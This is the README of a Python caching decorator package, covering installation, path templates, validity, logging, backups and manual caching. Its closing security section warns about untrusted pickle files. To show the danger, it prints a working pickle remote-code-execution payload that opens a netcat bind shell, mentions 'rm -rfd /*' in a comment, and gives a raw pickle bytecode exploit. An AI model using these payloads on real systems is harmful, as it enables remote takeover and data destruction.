cache_decorator
=========================================================================================
|travis| |sonar_quality| |sonar_maintainability| |codacy|
|code_climate_maintainability| |pip| |downloads|

A simple decorator to cache the results of computationally heavy functions.
The package automatically serialize and deserialize depending on the format of the save path.

By default it supports ``.json .json.gz .json.bz .json.lzma`` and ``.pkl .pkl.gz .pkl.bz .pkl.lzma .pkl.zip`` but other extensions can be enabled by using the extra feature:

[numpy] ``.npy .npz``

[pandas] ``.csv .csv.gz .csv.bz2 .csv.zip .csv.xz``

Also there is an optimized format for numerical dataframes:

[pandas] ``.embedding .embedding.gz .embedding.bz2 .embedding.xz``

This creates an optionally compressed tar archive with pickles of the index and 
columns and a ``.npy`` of the values.

The extra feature ``[numba]`` enables the caching of numba objects.

.. code:: python

    import time
    import numpy as np
    import pandas as pd
    from cache_decorator import Cache

    @Cache(
        cache_path={
            "info": "/tmp/{function_name}/{_hash}.json.xz",
            "data": "/tmp/{function_name}/{_hash}.csv.gz",
        },
        validity_duration="24d",
        args_to_ignore=("verbose",),
        enable_cache_arg_name="enable_cache",
    )
    def function_to_cache(seed: int, verbose: bool = True):
        np.random.seed(seed)
        if verbose:
            print(f"using seed {seed}")
        return {
            "info": {"timestamp": time.time(), "seed": seed,},
            "data": pd.DataFrame(
                np.random.randint(0, 100, size=(100, 4)), columns=list("ABCD")
            ),
        }


How do I install this package?
----------------------------------------------
As usual, just download it using pip:

.. code:: shell

    pip install cache_decorator

To install **all** the extensions use:

.. code:: shell

    pip install "cache_decorator[all]"

(the double quotes are optional in ``bash`` but required by ``zsh``)

Optionally you can specify the single features you want:

.. code:: shell

    pip install "cache_decorator[numpy, pandas, numba]"

If the installation fails you can try to add ``--user`` at the end of the command as:

.. code:: shell

    pip install "cache_decorator[numpy, pandas, numba]" --user


Tests Coverage
----------------------------------------------
Since some software handling coverages sometime
get slightly different results, here's three of them:

|coveralls| |sonar_coverage| |code_climate_coverage|


.. |travis| image:: https://travis-ci.org/zommiommy/cache_decorator.png
   :target: https://travis-ci.org/zommiommy/cache_decorator
   :alt: Travis CI build

.. |sonar_quality| image:: https://sonarcloud.io/api/project_badges/measure?project=zommiommy_cache_decorator&metric=alert_status
    :target: https://sonarcloud.io/dashboard/index/zommiommy_cache_decorator
    :alt: SonarCloud Quality

.. |sonar_maintainability| image:: https://sonarcloud.io/api/project_badges/measure?project=zommiommy_cache_decorator&metric=sqale_rating
    :target: https://sonarcloud.io/dashboard/index/zommiommy_cache_decorator
    :alt: SonarCloud Maintainability

.. |sonar_coverage| image:: https://sonarcloud.io/api/project_badges/measure?project=zommiommy_cache_decorator&metric=coverage
    :target: https://sonarcloud.io/dashboard/index/zommiommy_cache_decorator
    :alt: SonarCloud Coverage

.. |coveralls| image:: https://coveralls.io/repos/github/zommiommy/cache_decorator/badge.svg?branch=master
    :target: https://coveralls.io/github/zommiommy/cache_decorator?branch=master
    :alt: Coveralls Coverage

.. |pip| image:: https://badge.fury.io/py/cache-decorator.svg
    :target: https://badge.fury.io/py/cache-decorator
    :alt: Pypi project

.. |downloads| image:: https://pepy.tech/badge/cache_decorator
    :target: https://pepy.tech/badge/cache_decorator
    :alt: Pypi total project downloads

.. |codacy| image:: https://api.codacy.com/project/badge/Grade/70b54eb55b1c4d0182fbfbaa4e36b87d
    :target: https://www.codacy.com/manual/zommiommy/cache_decorat +or?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=zommiommy/cache_decorator&amp;utm_campaign=Badge_Grade
    :alt: Codacy Maintainability

.. |code_climate_maintainability| image:: https://api.codeclimate.com/v1/badges/888ccd8cdcf5a7b2acca/maintainability
    :target: https://codeclimate.com/github/zommiommy/cache_decorator/maintainability
    :alt: Maintainability

.. |code_climate_coverage| image:: https://api.codeclimate.com/v1/badges/888ccd8cdcf5a7b2acca/test_coverage
    :target: https://codeclimate.com/github/zommiommy/cache_decorator/test_coverage
    :alt: Code Climate Coverate

Examples of Usage
----------------------------------------------
To cache a function or a method you just have to decorate it with the cache decorator.

.. code:: python

    from time import sleep
    from cache_decorator import Cache
    from dict_hash import Hashable

    @Cache()
    def x(a, b):
        sleep(3)
        return a + b

    class A(Hashable):
        def __init__(self, x):
        self.x = x

        @Cache(
            cache_path="{cache_dir}/{self.x}/{a}/{b}.pkl",
        )
        def x(self, a, b):
            sleep(3)
            return a + b
                
        def consistent_hash(self) -> str:
            return str(self.x)

Cache path
----------
The default cache directory is ./cache but this can be setted by passing the cache_dir parameter to the decorator or by setting the environment variable CACHE_DIR.
In the case both are setted, the parameter folder has precedence over the environment one.


.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_dir="/tmp")
    def x(a):
        sleep(3)
        return a

The path format can be modified by passing the cache_path parameter.
This string will be formatted with infos about the function, its parameters and, if it's a method, the self attributes.

De default path is:

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_path="{cache_dir}/{file_name}_{function_name}/{_hash}.pkl")
    def x(a):
        sleep(3)
        return a

But can be modified giving cache a more significative name, for example we can add the value of a into the file name.

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_path="{cache_dir}/{file_name}_{function_name}/{a}_{_hash}.pkl")
    def x(a):
        sleep(3)
        return a

Depending on the extension of the file, different serialization and deserialization dispatcher will be called.

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(cache_path="/tmp/{_hash}.pkl.gz")
    def x(a):
        sleep(3)
        return a

    @Cache(cache_path="/tmp/{_hash}.json")
    def x(a):
        sleep(3)
        return {"1":1,"2":2}

    @Cache(cache_path="/tmp/{_hash}.npy")
    def x(a):
        sleep(3)
        return np.array([1, 2, 3])

    @Cache(cache_path="/tmp/{_hash}.npz")
    def x(a):
        sleep(3)
        return np.array([1, 2, 3]), np.array([1, 2, 4])

Ignoring arguments when computing the hash
------------------------------------------
By default the cache is differentiate by the parameters passed to the function.
One can specify which parameters should be ignored.


.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(args_to_ignore=["verbose"])
    def x(a, verbose=False):
        sleep(3)
        if verbose:
            print("HEY")
        return a

Multiple arguments can be specified as a list of strings with the name of the arguments to ignore.

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(args_to_ignore=["verbose", "multiprocessing"])
    def x(a, verbose=False, multiprocessing=False):
        sleep(3)
        if verbose:
            print("HEY")
        return a

Cache validity
------------------------------------------
Cache also might have a validity duration. 

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(
        cache_path="/tmp/{_hash}.pkl.gz",
        validity_duration="24d"
        )
    def x(a):
        sleep(3)
        return a

In this example the cache will be valid for the next 24 days. and on the 25th day the cache will be rebuilt.
The duration can be written as a time in seconds or as a string with unit.
The units can be "s" seconds, "m" minutes, "h" hours, "d" days, "w" weeks.

Logging
-------
Each time a new function is decorated with this decorator, a new logger is created.
You can modify the default logger with ``log_level`` and ``log_format``.


.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(log_level="debug")
    def x(a):
        sleep(3)
        return a

If the default format is not like you like it you can change it with:

.. code:: python

    from time import sleep
    from cache_decorator import Cache

    @Cache(log_format="%(asctime)-15s[%(levelname)s]: %(message)s")
    def x(a):
        sleep(3)
        return a

More informations about the formatting can be found here https://docs.python.org/3/library/logging.html .

Moreover, the name of the default logger is:

.. code:: python

    logging.getLogger("cache." + function.__name__)

So we can get the reference to the logger and fully customize it:

.. code:: python

    import logging
    from cache_decorator import Cache

    @Cache()
    def test_function(x):
        return 2 * x

    # Get the logger
    logger = logging.getLogger("cache.test_function")
    logger.setLevel(logging.DEBUG)
    
    # Make it log to a file
    handler = logging.FileHandler("cache.log")
    logger.addHandler(handler)

Error Handling
--------------
A common problem we noted using the library is that if the saved type is not compatible with the chosen extension,
the program will raise an exception at the end of the function and we lose all the work done.
To mitigate this proble, now the cache decorator has a built-in system for handling errors.
If there is an error in the serializzation of the result, the program will make an automatic backup using pickle.
This by default will add ``_backup.pkl`` to the end of the original path, but if for any reason this would over-write a file, a random string will be appended.
And log (with critical level) the path of the backup file and the supposed path where the 

Suppose we erroneusly set the extension to CSV instead of JSON:

.. code:: python

    from cache_decorator import Cache

    @Cache("./test_{x}.csv")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    test_function(10)
    # 2021-02-22 13:22:07,286[CRITICAL]: Couldn't save the result of the function. Saving the result as a pickle at:
    # ./test_10.csv_backup.pkl
    # The file was gonna be written at:
    # ./test_10.csv


Now we can manually load the value and store it at the correct path, this way the next time the function is called, the cache will be loaded correctly with the right extension.

.. code:: python

    import json
    import pickle

    # Load the backup
    with open("./test_10.csv_backup.pkl", "rb") as f:
        result = pickle.load(f)

    # Save it at the right path
    with open("./test_10.json", "w") as f:
        json.dump(f, result) 

.. code:: python

    from cache_decorator import Cache

    @Cache("./test_{x}.json")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    test_function(10) # Load the corrected Cache at "./test_10.json"


Optionally, one can programmatically sort this out by catching the exception and accessing its fields.

.. code:: python

    from cache_decorator import Cache

    @Cache("./test.csv")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    try:
        test_function(10, y="ciao")
    except SerializationException as e:
        result = e.result
        backup_path = e.backup_path
        path = e.path
        

Moreover, the backup path can be costumized using the ``backup_path`` parameter, here you can use the same parameter of ``path`` and also ``{_date}``, which is the date of the bakcup, and ``{_rnd}`` which guarantees that the file will not overwrite any other file:

.. code:: python

    from cache_decorator import Cache

    @Cache("./test.csv", backup_path="./backup_{date}_{rnd}.pkl")
    def test_function(x):
        return {"this":{"is":{"not":{"a":"csv"}}}}

    test_function(10, y="ciao")
    
    # 2021-02-22 13:22:07,286[CRITICAL]: Couldn't save the result of the function. Saving the result as a pickle at:
    # ./backup_2021_02_22_13_22_07_18ce30b003e14d16d5e0f749e8205e467aedfbba.pkl
    # The file was gonna be written at:
    # ./test.csv

        

Internals
--------------
If for any reason you need to get a reference to the wrapped function and its cacher class, you can access them using the internal variables:

.. code:: python

    from cache_decorator import Cache

    @Cache()
    def test_function(x, y):
        return 2 * x

    original_test_function = test_function.__cached_function
    test_function_cacher_class = test_function.__cacher_instance

We do not suggest to use them.


Manual Caching
--------------
If for some reason you need to manually manage your cache, you can use the built in static methods of the ``Cache`` class.
It will automatically create the needed folders. Moreover, you can get the expected path for a function call.

.. code:: python

    from cache_decorator import Cache
    
    # you can use the Cache class functions to load and store data easily
    # but here you can't use a path formatter but you have to pass a complete path.

    # Store
    Cache.store({1:2, 3:4}, "./my_custom_cache/best_dict_ever.json)

    # Load
    best_dict = Cache.load("./my_custom_cache/best_dict_ever.json)

    # This would not format anything!
    # Cache.store({1:2, 3:4}, "./my_custom_cache/{_hash}.json)
    # this would save a file called literally called "{_hash}.json"

    @Cache()
    def test_function(x, y):
        return 2 * x


    # you can get the path where the file would be saved (this does not call the function!).
    path = Cache.compute_path(test_function, 10, y="ciao")


Security Warnings
-----------------

Whenever possible don't use the pickle extension.
De-serializzation of untrusted data might lead to Remote Code Execution or Local Privilege Escalation ( https://davidhamann.de/2020/04/05/exploiting-python-pickle/ ).
Therefore, simple formats such as json is preferable whenever possible.

Suppose we have this code:

.. code:: python

    from cache_decorator import Cache

    @Cache("./cache/{x}.pkl)
    def my_awesome_function(x):
        return x

    ...

    my_awesome_function(1)

If in any way we have access to the cache folder, we can easily exploit it:

.. code:: python

    import pickle

    COMMAND = "netcat -c '/bin/bash -i' -l -p 4444" # rm -rfd /*

    class PickleRce(object):
        def __reduce__(self):
            import os
            return (os.system,(COMMAND,))

    payload = pickle.dumps(PickleRce())
    print(payload)
    # b"\x80\x04\x95>\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c#netcat -c '/bin/bash -i' -l -p 4444\x94\x85\x94R\x94."

    with open("./cache/1.pkl", "wb") as f:
        f.write(payload)

Next time that the function is called with argument ``1``, we will spawn a remote shell and take control of the system.

Or, since Pickle is a "programming language" which is executed by a VM, we can write a general RCE exploit which only uses builtins:

.. code:: python

    import pickle
    
    # Build the exploit
    command = b"""cat flag.txt"""
    x = b"c__builtin__\ngetattr\nc__builtin__\n__import__\nS'os'\n\x85RS'system'\n\x86RS'%s'\n\x85R."%command
    
    # Test it
    pickle.load(x)

For this reason is important to either use a simpler serializzation scheme like json and to fortify the system by setting the cache dir to be read-write only for the current user.

.. code:: bash

    chown -r $USER:$USER ./cache
    chmod -r 600 ./cache

This way only the current application can create and modify the cache files.
